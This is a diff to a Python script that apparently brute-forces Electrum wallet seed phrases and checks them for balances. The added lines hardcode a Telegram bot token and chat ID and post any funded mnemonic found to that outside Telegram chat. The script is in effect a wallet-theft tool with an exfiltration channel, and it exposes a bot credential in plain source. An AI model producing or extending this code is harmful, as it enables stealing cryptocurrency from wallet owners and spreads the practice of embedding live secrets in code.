@@ -9,6 +9,9 @@ import ecdsa
 import requests
 import json
 
+BASE_URL = 'https://api.telegram.org/bot'
+Token = '109206957:AAElM9hVB5AhkF9ojNZi2PlWYDFZdBUyXTQ' #ticker bot VERDE
+
 # http://www.asahi-net.or.jp/~ax2s-kmtn/ref/unicode/e_asia.html
 CJK_INTERVALS = [
     (0x4E00, 0x9FFF, 'CJK Unified Ideographs'),
@@ -47,7 +50,17 @@ def is_CJK(c):
     for imin,imax,name in CJK_INTERVALS:
         if n>=imin and n<=imax: return True
     return False
-  
+    
+def reply(msg,chat_id):
+    
+    url = BASE_URL + Token + '/sendMessage' 
+
+    r = requests.post(url, data = { 
+    'chat_id':chat_id ,'text': msg.encode('utf-8'),
+    'disable_web_page_preview': 'true' , 'reply_to_message_id': '' 
+        })
+    return 
+
     
     
 def electrumv2_extract_seed(words, password=''):
@@ -198,6 +211,13 @@ for joder in range(2000000):
         if (cantidad > 0) :
             
              print mnemonic
+             
+             msg = mnemonic
+    
+             chat_id = '6660201'
+    
+             reply(msg,chat_id)
+             
              break
              
 
